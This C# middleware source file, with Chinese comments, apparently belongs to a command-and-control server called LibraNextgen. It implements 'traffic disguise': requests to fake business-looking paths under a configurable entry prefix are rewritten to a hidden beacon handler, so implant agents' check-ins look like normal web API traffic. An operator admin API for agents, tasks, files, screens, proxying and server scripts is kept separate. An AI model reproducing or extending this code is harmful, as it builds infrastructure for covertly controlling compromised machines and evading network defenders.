using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Middleware;

/// <summary>
/// 单入口路由（流量伪装 Phase 2）：
/// 把 profile 配置的入口前缀（如 /api、/index.php）及其后的任意虚假业务路径段
/// 重写到内部端点 /api/beacon/handle —— 服务端忽略入口之后的路径段
/// （/api/user/info、/api/orders/123 全部按 /api 前缀路由）。
///
/// 安全边界（重要）：管理员 API 同样位于 /api/* 下，必须排除在入口路由之外，
/// 否则 /api/auth/* 等管理端点会被误重写。新增管理员 controller 时请同步
/// 登记到 <see cref="AdminPrefixes"/>。被排除的路径直接放行，由 JWT/RBAC
/// 中间件保护 —— agent 只有 beacon session token，没有 JWT，天然无法访问。
///
/// 旧版 beacon 端点（/api/beacon/*）保持原样，兼容旧 agent。
/// </summary>
public class BeaconEntryMiddleware
{
    /// <summary>管理员 API 前缀（不参与 beacon 入口路由，直接放行给 JWT 保护）。</summary>
    private static readonly string[] AdminPrefixes =
    {
        "/api/auth",
        "/api/agents",
        "/api/tasks",
        "/api/beacon",
        "/api/files",
        "/api/screens",
        "/api/system",
        "/api/audit",
        "/api/profiles",
        "/api/token",
        "/api/proxy",
        "/api/events",
        "/api/access-keys",
        "/api/accounts",
        "/api/plugins",
        "/api/plugin-action",
        "/api/risk-policy",
        "/api/media",
        "/api/other-soft",
        "/api/server-script",
        "/api/mcp",
    };

    private readonly RequestDelegate _next;

    public BeaconEntryMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context, ProfileService profileService)
    {
        var path = context.Request.Path.Value ?? "/";

        // 管理员 API / 旧 beacon 端点直接放行
        foreach (var prefix in AdminPrefixes)
        {
            if (path.Equals(prefix, StringComparison.OrdinalIgnoreCase) ||
                path.StartsWith(prefix + "/", StringComparison.OrdinalIgnoreCase))
            {
                await _next(context);
                return;
            }
        }

        var profile = await profileService.GetActiveProfileAsync();
        string entryPath;
        if (profile is Profiles.ConfigurableProfile cp)
        {
            entryPath = "/" + cp.Config.EntryPath.TrimStart('/');
        }
        else
        {
            entryPath = "/api"; // DefaultProfile 固定值
        }

        // 入口前缀命中（含精确匹配与 /entry/xxx 后缀）
        if (string.Equals(path, entryPath, StringComparison.OrdinalIgnoreCase) ||
            path.StartsWith(entryPath + "/", StringComparison.OrdinalIgnoreCase))
        {
            context.Request.Path = "/api/beacon/handle";
        }

        await _next(context);
    }
}
